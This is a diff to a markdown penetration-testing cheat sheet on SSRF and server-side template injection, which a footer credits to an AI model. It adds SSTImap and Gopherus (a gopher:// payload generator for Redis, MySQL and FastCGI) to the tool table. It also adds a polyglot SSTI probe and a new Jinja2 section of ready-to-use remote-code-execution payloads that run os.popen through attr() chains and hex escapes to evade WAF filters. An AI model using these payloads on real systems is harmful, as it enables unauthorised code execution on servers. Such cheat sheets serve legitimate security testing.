@@ -17,7 +17,9 @@ Server-side vulnerabilities where attacker-controlled input is processed by the 
 | `Burp Suite` | Intercept and modify requests, Collaborator for OOB SSRF callbacks |
 | `interactsh-client` | OOB interaction detection for blind SSRF — `go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest` |
 | `tplmap` | Automated SSTI detection and exploitation — `git clone https://github.com/epinna/tplmap` |
+| `SSTImap` | Actively maintained tplmap fork — `git clone https://github.com/vladko312/SSTImap` |
 | `SSRFmap` | Automated SSRF exploitation with internal service probing — `git clone https://github.com/swisskyrepo/SSRFmap` |
+| `Gopherus` | Generates gopher:// payloads for Redis, MySQL, FastCGI, SMTP — `git clone https://github.com/tarunkant/Gopherus` |
 | `curl` | Manual SSRF probing, redirect tracing (`-L`), header inspection |
 
 ---
@@ -191,6 +193,11 @@ User input is concatenated into a template string and evaluated by the template 
 ### Detection
 
 ```bash
+# Polyglot probe — triggers errors across all major engines at once
+# Send this as a single value; an error or garbled output confirms SSTI exists
+curl -s "http://<target>/page?name=%24%7B%7B%3C%25%5B%25%27%22%7D%7D%25%5C."
+# Decoded: ${{<%[%'"}}%\.
+
 # Inject math expressions — each engine has unique syntax
 # If any of these return evaluated results, SSTI exists:
 curl -s "http://<target>/page?name={{7*7}}"      # Jinja2/Twig → 49
@@ -206,7 +213,8 @@ curl -s "http://<target>/page?name={{7*'7'}}"     # Jinja2 → 7777777, Twig →
 # ${7*7} → 49         = Freemarker (Java) or Mako (Python)
 # *{7*7} → 49         = Spring (Java / Thymeleaf)
 
-# Also test in headers, cookies, form fields, JSON values
+# Test everywhere — not just URL params
+# Headers, cookies, form fields, JSON values, email name/subject fields
 ```
 
 ### Jinja2 (Python — Flask/Django)
@@ -233,6 +241,33 @@ curl -s "http://<target>/page?name={{7*'7'}}"     # Jinja2 → 7777777, Twig →
 # URL-encode for GET parameters:
 # %7B%7Bcycler.__init__.__globals__.os.popen(%27id%27).read()%7D%7D
 curl -s --data-urlencode "name={{cycler.__init__.__globals__.os.popen('id').read()}}" "http://<target>/greet"
+```
+
+### Jinja2 — Filter Evasion (when `__` is blocked)
+
+```python
+# If the WAF/filter blocks __ (double underscore), use attr() filter
+# attr() accesses attributes by string name — avoids writing __ literally
+
+# Build the string "__class__" without typing it directly
+# Using request object (always available in Flask):
+{{request|attr('__class__')}}
+{{request|attr('__class__')|attr('__mro__')}}
+
+# Combine with char codes to avoid any literal string matching
+# underscore = chr(95), so __ = chr(95)~chr(95)
+{% set us = namespace(x='') %}
+{% set us.x = joiner.__init__.__globals__ %}  # if __ not filtered at this depth
+
+# Full RCE chain using attr() to avoid __ in argument positions:
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+# \x5f = _ in hex — bypasses string-based filters
+
+# Alternative — use config object globals:
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+
+# If periods also filtered, use bracket notation:
+{{config['__class__']['__init__']['__globals__']['os']['popen']('id')['read']()}}
 ```
 
 ### Twig (PHP — Symfony)
@@ -452,5 +487,5 @@ curl -sv "http://<target>/redirect?url=https://example.com" 2>&1 | grep -i "^< l
 ---
 
 *Created: 2026-03-04*
-*Updated: 2026-05-13*
+*Updated: 2026-05-14*
 *Model: claude-sonnet-4-6*
